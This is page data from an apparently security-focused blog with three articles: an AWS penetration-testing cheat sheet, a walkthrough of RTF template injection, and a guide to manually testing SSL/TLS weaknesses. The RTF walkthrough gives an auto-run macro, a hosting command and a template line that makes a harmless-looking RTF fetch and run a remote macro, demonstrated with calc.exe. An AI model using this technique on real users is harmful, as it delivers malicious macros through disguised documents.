{"componentChunkName":"component---src-templates-blog-post-js","path":"/articles/speaking-aws/","result":{"pageContext":{"post":{"fields":{"slug":"/speaking-aws"},"excerpt":null,"frontmatter":{"date":"9th February 2022 ","title":"Speaking AWS","description":"aws, cloud, s3-buckets, scoutsuite","tags":"aws, cloud, s3-buckets, scoutsuite","posttype":"article"},"body":"# Introduction To Terminology\n\n\n| AWS Term                             | Pentester Analogy                                                                           |\n|--------------------------------------|---------------------------------------------------------------------------------------------|\n| Region                               | Geographical location containing availability zones                                         |\n| AZ (Availability Zone)               | Location mapped to a physical data centre in a region                                       |\n| VPC (Virtual Private Cloud)          | The network infrastructure (can include public and private subnets)                         |\n| EC2 (Elastic Compute Cloud) instance | Virtual Machine                                                                             |\n| Security Groups                      | Firewall rules applied to the single instance                                               |\n| Network ACL                          | Firewall rules applied to a subnet                                                          |\n| ELB (Elastic Load Balancer)          | Network load balancer to optimise traffic across instances.                                 |\n| IAM (Identity & Access Management)   | A service to manage users, groups, roles and security policies                              |\n| S3 (Simple Storage Service Bucket)   | A container for any type of data                                                            |\n| CloudTrail & CloudWatch              | Logging, Monitoring and Auditing of Events.                                                 |\n| RDS (Relational Database Service)    | A service allowing the creation of relational databases (MS SQL, Oracle, Aurora/MySQL, etc) |\n| KMS (Key Management Service)         | KeyChain, Password Vault, etc                                                               |\n\nhttps://cloudonaut.io/aws-security-primer/\n\n\n# Orientation \n\nConfigure the CLI for first usage\n```\naws configure --profile <profile name>\n```\n\n> It should be noted that the credentials will be stored in your home directory: `~/.aws/credentials`\n\nList AWS regions & VPC(s) available\n```\naws ec2 describe-regions\naws ec2 describe-vpcs\n```\n\nGet AWS console alias\n```\naws iam list-account-aliases\n```\n\nGet username associated to an AWS API KEY\n```\naws iam get-user\n```\n\nIf you have no access to IAM then the following command will work.\n```\naws sts get-caller-identity \n```\n\n## Getting Your Whereabouts\n\n\nFind Your ID\n```\naws sts get-caller-identity\n```\n\nLog in to the console\n```\nhttps://Your_Account_ID.signin.aws.amazon.com/console/\n```\n\n## Setting Up Temporary Credentials\n\nTo use the credentials returned by the assume-role \n\nIn Linux set some bash variables with export\n```\n$ export AWS_ACCESS_KEY_ID=XXXX\n$ export AWS_SECRET_ACCESS_KEY=XXXX\n$ export AWS_SESSION_TOKEN=XXXX\n```\n\nIn Windows do the equivalent with SET\n```\nC:\\> SET AWS_ACCESS_KEY_ID=XXXX\nC:\\> SET AWS_SECRET_ACCESS_KEY=XXXX\nC:\\> SET AWS_SESSION_TOKEN=XXXX\n```\n\n> Note that this will set the credentials for your default AWS account in your machine. This is similar to running `aws configure` without specifying a profile name. \n\nSecurity Groups vs Network ACLs\n\n| Security Group                                                                                                                                                | Network ACL                                                                                                                                            |\n|---------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------|\n| First layer of defence                                                                                                                                        | Second Layer of defence                                                                                                                                |\n| Operates at instance level                                                                                                                                    | Operates at subnet level                                                                                                                               |\n| Supports allow rules only                                                                                                                                     | Supports allow and deny rules                                                                                                                          |\n| \"stateful\": Return traffic is automatically allowed regardless of any rules                                                                                   | \"stateless\": Return traffic must be explicitly allowed by the rules                                                                                     |\n| All rules are evaluated before deciding if traffic is allowed                                                                                                 | Rules are evaluated in order when deciding to allow traffic                                                                                            |\n| Applies to an instance only if someone specifies the security group when launching the instance, or associates the security group with the instance later on. | Automatically applies to all instances in the subnets it's associated with (therefore, you don't have to rely on users to specify the security group). |\n\n## Installing AWS CLI\n\n\n\n\n## Enumerating With AWS CLI\n\n\n\n### S3 Buckets\n\n\n```\naws sts assume-role --role-arn arn:aws:iam::093313834310:role/pentesterRole --role-session-name pentesterRole --profile assessment\n```\n\n\nListing Buckets\n```\naws s3 ls \naws s3api list-buckets \n```\n\n\nCopy File From Bucket To Current Directory\n```\naws s3 cp s3://this-will-be-the-bucket-name/the-name-of-the-file.txt . \n```\n\n\n\n## Networking Configuration Review \n\n### Using Cloud Mapper\n\n<h5 class=\"step\">Edit the config.json file to enter the AWS ID</h5>\n\nWe can edit the config file via the `cloudmapper.py` python script. \n```\npython cloudmapper.py configure add-account --config-file <config.json> --name <arbitrary name> --id <AWS Account ID>\n```\n\nOr we can just directly edit the config.json file using your prefered editor. Which of course is `vi` ;-)\n```\nvi config.json\n```\n\n<h5 class=\"step\">Prepare and start the Web Server</h5>\n\n\nFirst we prepare\n```\npython cloudmapper.py prepare --config <config.json> --account <arbitrary_name>\n```\n\nThen we start\n```\npython cloudmapper.py webserver\n```\n\n## ScoutSuite\n\n\nInstalling ScoutSuite\n```\n$ git clone https://github.com/nccgroup/ScoutSuite\n$ cd ScoutSuite\n$ virtualenv -p python3 venv\n$ source venv/bin/activate\n$ pip install -r requirements.txt\n$ python scout.py --help\n```\n\nWe can run ScoutSuite in the following way. We use the `--profile` to specify API credentials to use. \n```\nscout.py --provider aws --profile <profile_name>\n```\n\n> Specifying the provider type (aws) and credentials is mandatory. \n\nWe can specify a report directory to store results with the `--report-dir` flag. \n```\nscout.py --provider aws --profile <profile_name>  --report-dir <folder>\n```\n\nWe can specify which regions we want ScoutSuite to look at with the `--regions` flag. \n```\nscout.py --provider aws --profile <profile_name> --region us-east-1,eu-west-1\n```\n\nWe can limit the services we want to check for\n```\nscout.py --provider aws --profile <profile_name> --services iam,s3\n```\n\nThere are other flags that may be of interest which can be found by looking at the help `--help`\n```\nscout.py --help\n```\n\n## Priv Escalation\n\n\nPmapper tool by NCC \n\n\n### Pacu\n\n\n<a href=\"https://github.com/RhinoSecurityLabs/pacu\" target=\"_blank\" class=\"external\" title=\"Pacu Tool By Rhino Security Labs\" rel=”nofollow”>Pacu Tool By Rhino Security Labs</a>\n\n\nInstalling Pacu\n```\npip3 install pip\npip3 install -U pacu\npacu\n```\n\nEnumeration of the root user. Can be done manually but after a few attempts, it requires a captcha. \n\n\nEnumeration of Account ID via \n```\nIAM -> Roles > Elevate-S3 > Edit trust policy\n```\n\nThe team over at Rhino Security have a great write up on how to enumerate users via this process. <a href=\"https://rhinosecuritylabs.com/aws/aws-iam-user-enumeration/\" target=\"_blank\" class=\"external\" title=\"AWS IAM User Enumeration\" rel=”nofollow”>Rhino Security Labs - AWS IAM User Enumeration</a>\n\n\n## Steam Pipe\n\n\nRunning SteamPipe\n```\nsteampipe check benchmark.cis_v140 --export=report.html --export=report.csv\n```\n\n\n## Prowler\n\n\nRunning Prowler. Use the `-p` flag to specify API profile to use\n```\n./prowler -p <profile_name>\n```\n\nUse `ansi2html` if you want an HTML report\n```\npip install ansi2html\n./prowler -p <profile_name> | ansi2html -la > report.html\n```\n\n## Assessing AWS\n\n> The following is a very generic methodology you can use until you refine your own approach via experience. \n\n* Launch Scout Suite to collect configuration data and initial list of issues\n* Launch prowler and collect list of issues\n* Review Trusted Advisor (if available for the account)"},"prev":{"fields":{"slug":"/rtf-template-injection"},"excerpt":"In this example, we will demonstrate how to use the “template” control word to cause an RTF file to pop up the calculator app when opened.…","frontmatter":{"date":"9th February 2022 ","title":"RTF Template Injection","description":"In this example, we will demonstrate how to use the “template” control word to cause an RTF file to pop up the calculator app when opened.  “Hold on... I can use the Start menu to do that. Why should I care?”, you may wonder. The simple answer is that this technique can be easily modified to spread malicious macros using otherwise benign looking RTF files.","tags":"exploit-development, rtf","posttype":"article"},"body":"\nIn this example, we will demonstrate how to use the “template” control word to cause an RTF file to pop up the calculator app when opened.  “Hold on... I can use the Start menu to do that. Why should I care?”, you may wonder. The simple answer is that this technique can be easily modified to spread malicious macros using otherwise benign looking RTF files.\n\n## What is an RTF file?\n\nTapping away in front of your Macintosh or the early versions of Windows, did you ever wonder what those .rtf files (Rich Text Format) were that you ever so occasionally encountered? The ones that were opened up with text editors (featuring a horizontal ruler) other than your trusted notepad?\n\nRTF traces back to the late 1980s when it was developed and released. Rich text format files, as opposed to plain text files, can contain images, different font styles, formatting, and more. They are interoperable, which means they can be processed by a wide range of technologies, making them a portable file type. \n\n## Why should I care?\n\n\"Why should I care?\" you might wonder. The short answer is that with little modification, this technique can be leveraged to spread malicious macros in otherwise benign RTF files - as actively being done by threat actor groups online. Within RTF files, specific control words (see http://latex2rtf.sourceforge.net/rtfspec_62.html for more) are used. These control words are specially formatted commands that instruct applications how to handle the file. Let us get started!  \n\n# Instructions - RTF template injection with a calculator pop-up\n\nIn this example, we will demonstrate how to use the \"template\" control word to cause an RTF file to fetch another file from a web server controlled by us.  This example makes use of the template editing capabilities of RTF files, as well as the ability to fetch resources from a specified URL. The code we will use opens up a calculator on a Windows-based operating system when the RTF file is run. Note that macros will require enabling on your system.\n\n<h5 class=\"step\">Step 1 - Create a macro-enabled Word template file</h5>\n\nThis file will contain our macro that executes the calculator app when the RTF file is opened. \n\nOpen Word and add the following Visual Basic code (macro) to it. Save the file as `calc.dotm`. \n\n```\nSub AutoOpen()\nDim Program As String\nDim TaskID As Double\nProgram = \"calc.exe\"\nTaskID = Shell(Program, 1)\nEnd Sub\n```\n\n*If you are unfamiliar with creating Word template files, we recommend checking out Microsoft's documentation on them: https://support.microsoft.com/en-us/office/save-a-word-document-as-a-template-cb17846d-ecec-49d4-82ea-a6f5e3e8b9ae.*\n\n<h5 class=\"step\">Step 2 - Start a web server</h5>\n\nLaunch an HTTP server in the folder containing the 'calc.dotm' file using your preferred method. If you are using Python 3, you can use the following command with the port number of your choice. \n\n```\npython3 -m http.server <port number>\n```\n\n<h5 class=\"step\">Step 3 - Create a benign RTF file</h5>\n\nGet or make a simple RTF file. We will modify this in the next step to fetch our macro-enabled template file from the web server launched.\n\n![](5e05c49b-2704-464a-9eb8-6afe16b298ec.png)\n\n*There are sample RTF files you can use available online. Please always have your anti-virus solution enabled when downloading files from the Internet.*\n\n<h5 class=\"step\">Step 4 - Add remote template fetching capabilities to the RTF file</h5>\n\nUse a HEX editor to open the RTF file created in the previous step. I used Hex Editor Neo. \n\nLook for a pre-existing enclosing group for a font family control word (for example, Times New Roman if your file uses it). Insert the following text after the font's ending tag with your listening IP and port + payload/file to fetch. \n\n```\n{\\*\\template http://<your-IP>:<port number>/calc.dotm}\n```\n\n![](514cab5a-57fa-4783-9db1-35ca3867a8ef.png)\n\n<h5 class=\"step\">Step 5 - Show time</h5>\n\nSave the changes and open the RTF file in its default application. If you are a Windows user, this will likely be Word. The remote file will be loaded from your web server and used to launch the calculator program when the RTF file is opened.\n\nThe below screen capture displays the macro-enabled template file being fetched.\n\n![](20e0eb7d-9a66-4ff2-991c-366e9a7a3d84.png)\n\nThe below screen capture displays the RTF file opened and the calculator app launched.\n\n![](c6ec75ba-dad0-4755-903a-7de8f5065320.png)\n\n### Well that was easy... Where to from here?\n\nI hope this article has served as a foundation for your further explorations. Why not look into creating your custom macro-enabled template files next?"},"next":{"fields":{"slug":"/vulnerabilities-in-ssl-and-tls-manually-testing"},"excerpt":null,"frontmatter":{"date":"3rd February 2022 ","title":"Vulnerabilities in SSL & TLS :- Manually Testing","description":"As OpenSSL has improved, it has become more challenging to use one binary for testing the full range of modern to legacy SSL/TLS configurations. The reason for that is following Heartbleed; the OpenSSL developers started a significant overhaul, part of which included the elimination of outmoded cryptography.","tags":"ssl, tls","posttype":"article"},"body":"# OpenSSL For Testing\n\nAs OpenSSL has improved, it has become more challenging to use one binary for testing the full range of modern to legacy SSL/TLS configurations. The reason for that is following Heartbleed; the OpenSSL developers started a significant overhaul, part of which included the elimination of outmoded cryptography. While this is fantastic news for customers from now on; it means we may need to employ two versions of the OpenSSL binary during our engagements to test for a wide range of conditions: one binary for the new features such as TLS v1.3 and one binary for testing old protocols and Cipher configurations such as when testing if a service supports SSL v2.0.\n\nWe can compile out own version of OpenSSL for testing legacy environments. If we start with the OpenSSL 1.0.2g source code, we can make the static binary as follows.\n\n```\n::text\ncd /tmp\nwget https://openssl.org/source/openssl-1.0.2g.tar.gz\ngunzip openssl-1.0.2g.tar.gz\ntar -xvf openssl-1.0.2g.tar\ncd /tmp/openssl-1.0.2g/\n./config  --prefix=/opt/openssl-1.0.2g --openssldir=/opt/openssl-1.0.2g no-shared enable-ssl2 enable-ssl3 enable-weak-ssl-ciphers\nmake depend \nmake all\n```\n\nWe can now test what we have compiled and make sure we are referencing the correct binary for our needs. If we supply the `openssl` binary with no options, we should be presented with an interactive prompt. To confirm the OpenSSL version, type as follows.\n\n```\n/opt/openssl-1.0.2g/bin/openssl                                                                                                                                                          \nOpenSSL> version\nOpenSSL 1.0.2g  1 Mar 2016\nOpenSSL> \n```\n\nWe can compare that to my current binary in Kali Linux. \n\n```\n/usr/bin/openssl \nOpenSSL> version\nOpenSSL 1.1.1l  24 Aug 2021\nOpenSSL> \n```\n\nWe can see that OpenSSL 1.0.2g was released 1 March 2016, and version 1.1.1l was released 24 August 2021. Using the `openssl ciphers` syntax, we see more than just a version number,date and release separating these binaries.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n    <img src=\"/static/6b0fdc3f-f387-44ca-9ddc-08cacb6cc151.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">Number of Ciphers Supported Between Versions  1.1.1l and 1.0.2g</figcaption></figure>\n\n## Connecting\n\nOpenSSL provides different features and tools for SSL/TLS related operations. We can see a list of these standard commands running the following syntax.\n\n```\nopenssl list-standard-commands\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/b644efe1-38f3-49b1-a45c-eb4b57693e5b.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">Cropped Image of OpenSSL Binary Listing Standard Commands</figcaption></figure>\n\n\nAs can be seen, the OpenSSL binary provides many different features and tools for operations related to working with the TLS and SSL protocol. One of these tools, the s_client tool, connects, checks, and lists HTTPS and TLS/SSL-related information. We can assess services using SSL or TLS encryption for our customers using this tool. But first, let us look at its basic usage.\n\nWe will look at one of the most common uses for using the OpenSSL s_client tool, connecting to a remote TLS/SSL website. We provide it with a target and a port number to do this.\n\n```\n::text\n/opt/openssl-1.0.2g/bin/openssl s_client -connect evilsaint.com:443\n```\n\nThis command connected to the evilsaint.com web server on port 443, attempted a full TLS/SSL handshake, and then printed out the following information.\n\n1. The connection status\n2. Chain Verification Status\n3 The certificate chain the server sent \n4 The peer certificate in base64 encoded format\n5 Details regarding the rest of the handshake. \n\n\nAs we move on to expanding on this example it might be prudent to talk about the `-connect` switch.  The connect switch can take any TCP IP address or FQDN. If we looked up the IP address for evilsaint it would show as 192.248.151.138. We could replace the evilsaint.com with the resolved IP address and it would still reach out to attempt a handshake with the webserver. \n```\n::text\n/opt/openssl-1.0.2g/bin/openssl s_client -connect 192.248.151.138:443\n```\n\nWhat if the IP address we were connecting to hosted multiple websites? If we take a look at the following Apache Web Server configuration example (below), we can see there is run server running on the IP Address 172.20.30.40 and there are two domains 'www.example.com' and 'www.example.org'.\n```\n# This is the \"main\" server running on 172.20.30.40\nServerName server.example.com\nDocumentRoot \"/www/mainserver\"\n\n<VirtualHost 172.20.30.50>\n    DocumentRoot \"/www/example1\"\n    ServerName www.example.com\n\n    # Other directives here ...\n</VirtualHost>\n\n<VirtualHost 172.20.30.50>\n    DocumentRoot \"/www/example2\"\n    ServerName www.example.org\n\n    # Other directives here ...\n</VirtualHost>\n```\n\nJust how if you configured virtual hosting with Apache, you would use the domain name to distinguish between multiple websites hosted on the same server. We can do the same with the `-servername` flag. The `-servername` flag lets us set the Server Name Indication (SNI) in the ClientHello message to the given value.  The `-connect` switch is used to establish the TCP connection and can be a FQDN or IP address. The `-servername` is used to specify the domain hostname. If the `-servername` option is empty then openssl sends the same DNS name as what is used for the `-connect` option. If an IP is specified for the `-connect` option and the `-servername` is not provided then the default behaviour since OpenSSL 1.1.1 is to set SNI is to \"localhost\".  \n \n\nHere are two examples demonstrating the same IP address but specifying two different domains. \n```\n::text\nopenssl s_client -servername domain.com -connect X.X.X.X:443\nopenssl s_client -servername domain2.com -connect X.X.X.X:443\n```\n\nLet us move on and discuss a few more switches that can aid our queries. \n\n* -crlf\n* -showcerts\n\nThe addition of the `-crlf` flag. This flag translates line feeds from your terminal into character return & line feeds (CR+LF) that are required by some servers. The `-showcerts` option can be useful when you need to see all certificates returned from the server. \n\nLet us look at an example\n```\n::text\n/opt/openssl-1.0.2g/bin/openssl s_client -crlf -showcerts -connect evilsaint.com:443 -servername www.evilsaint.com\n```\n\n## Automated Testing \n\nThe purpose of this article is to look at ways of manually testing for TLS/SSL weaknesses and so for the most part I want to avoid discussion on popular tools such as testssl, sslyze and sslscan. With that said, after seeing the support for various ciphers and protocols change between versions of the OpenSSL binary versions I am sure there will be those that are interested in how these tools over come this problem and would like to make sure they are testing using a particular version of OpenSSL. \n\n**Testssl**\nTestssl is a bash script that is a direct wrapper around the openssl binary. When you start any scan the output will tell you which version of the binary it used to complete its tests. To change the binary that testssl uses we can enter it as an option when running the command. \n```\n::text\ntestssl.sh openssl=/path/to/openssl <URI>\n```\n\nLet us compare the default system binary to our newly compiled one. \n```\n::text\ntestssl --openssl=/opt/openssl-1.0.2g/bin/openssl https://evilsaint.com\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/2a69cc1d-4400-4ff3-8875-0da4e92e1158.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">Support for ~142 Ciphers </figcaption></figure>\n\n```\ntestssl https://evilsaint.com\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/10d48df7-e237-4dcc-8fa6-7ec25875b8c9.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">Support for ~81  Ciphers</figcaption></figure>\n\n**SSLScan**\nIf you complete the following on a terminal you will likely find that SSL Scan has been compiled to use the local system binary and there doesn't appear to be an option for sepcifying the openssl binary. \n```\nsslscan --version            \n```\n\nAll however is not lost. SSL Scan 2 has had a major backend code rewrite which means it is no longer reliant on the version of OpenSSL for many of the checks it performs.  Meaning it is possible to support legacy protocols such as SSLv2 and SSLv3 regardless of the version of OpenSSL that is has been compiled against. \n\n**SSLyze**\nSSLyze is an nearly all Python code project but similar to other tools it requires access to low-level OpenSSL functionality. In order to satisfy this the author has created an OpenSSL wrapper written in C code which is called nassl. This was specifically developed for SSLyze. \n\n\n## Manually Testing For Vulnerabilities\n\n### Check For SSL v2 Support\n\nIn addition to the vulnerabilities support for Version 2 of SSL allows it should be noted that in terms of real life practicality, Microsoft has stopped supporting SSL 2.0 in the Windows 10 operating system and IE6 was the last browser that supported SSL version 2 by default. There should be very little reason, if any, to support SSL version 2.0\n\nTo check whether SSLv2 is enabled on the remote host, the following command can be used: \n```\n::text\n/opt/openssl-1.0.2g/bin/openssl s_client -ssl2 -connect evilsaint.com:443\n```\n\nIf SSLv2 is supported, the handshake will complete and server certificate information will be returned. \n\n\nAlternatively to using the OpenSSL command line tool that you can try and use Curl. \n\n```bash\ncurl --sslv2 -I evilsaint.com:443\n```\n\nCheck the output, you want to see something similar to the following:\n```\n* SSL peer handshake failed\n```\n\nAs opposed to \n```\n* SSL 2.0 connection using SSL_NULL_WITH_NULL_NULL\n```\n\n### Check For SSL v3 Support\n\nTo test whether a system supports SSLv3, the following OpenSSL command can be used:\n```\n::text\nopenssl s_client --sslv3 -connect evilsaint.com:443\n```\n\nIf SSLv2 is supported, the handshake will complete and server certificate information will be returned. \n\n\nAlternatively to using the OpenSSL command line tool that you can try and use Curl. \n\n```\n::text\ncurl --sslv3 -I evilsaint.com:443\n```\n\nCheck the output, you want to see something similar to the following:\n```\n* SSL peer handshake failed\n```\n\nAs opposed to \n```\n* SSL 3.0 connection using SSL_NULL_WITH_NULL_NULL\n```\n\n\n### Cipher Suites\n\n\n```\nopenssl s_client -cipher\n```\n\n```\n::text\nnmap --script ssl-enum-ciphers -p 443 example.com\n```\n\n### Server Certificate\n\n```\n::text\nopenssl s_client -connect example.com:443 | openssl x509 -noout -text\n```\n\n\n### Secure Renegotiation \n\n\nThe following demonstrates how to verify if a system supports secure renegotiation.\n\n```\n::text\nopenssl s_client -connect example.com:443\n```\n\n### Client Initiated Renegotiation\n\nThe following demonstrates how to check if client initiated renegotiation is supported.\n```\n::text\nopenssl s_client -connect example.com:443\n```\n\nOnce the connection is established, the server will wait for us to type the next command. We can write the following two lines in order to initiate a renegotiation by specifying R in the second line, followed by enter or return.\n\n```\n::text\nopenssl s_client -connect host:port\nHEAD / HTTP/1.0\nR\n<Enter or Return key>\n```\n\n### TLS Compression\n\nTo test whether a server supports TLS compression, and is vulnerable to CRIME, the following method can be used: \n```\n::text\nopenssl s_client -connect example.com:443\n```\n\nFor servers that have TLS compression disabled, the response will be similar to the following. The \"Compression: NONE\" shows that this server rejects usage of TLS-level compression.\n\n### HTTP Compression\n\nTo test whether a server supports deflate or compression, the following steps can be performed: \n```\n::text\nopenssl s_client -connect example.com:443\n```\n\nSubmitting the following will allow us to see if HTTP compression is supported by the server.\n```\nGET / HTTP/1.1\nHost: example.com\nAccept-Encoding: compress, gzip\n```\n\n### Change Cipher Spec Injection\n\nA weakness exists in some versions of OpenSSL which can be exploited by intermediary third parties in order to retrieve sensitive information from encrypted communication.\n\nAffected Versions:\n\n•    OpenSSL 1.0.1 through 1.0.1g\n•    OpenSSL 1.0.0 through 1.0.0l\n•    all versions before OpenSSL 0.9.8y\n\nTesting requires using publicly available tools, such as the the ‘ssl-ccs-injection’ nmap script by Claudiu Perta, which can be used to test for this vulnerability. This script can be downloaded from https://nmap.org/nsedoc/scripts/ssl-ccs-injection.html.\n\n```\n::text\nnmap -p 443 --script ssl-ccs-injection example.com\n```\n\n### Heartbeat - TLS Extension\n\n\n```\n::text\nopenssl s_client –tlsextdebug\n```"}}},"staticQueryHashes":["310218920"],"slicesMap":{}}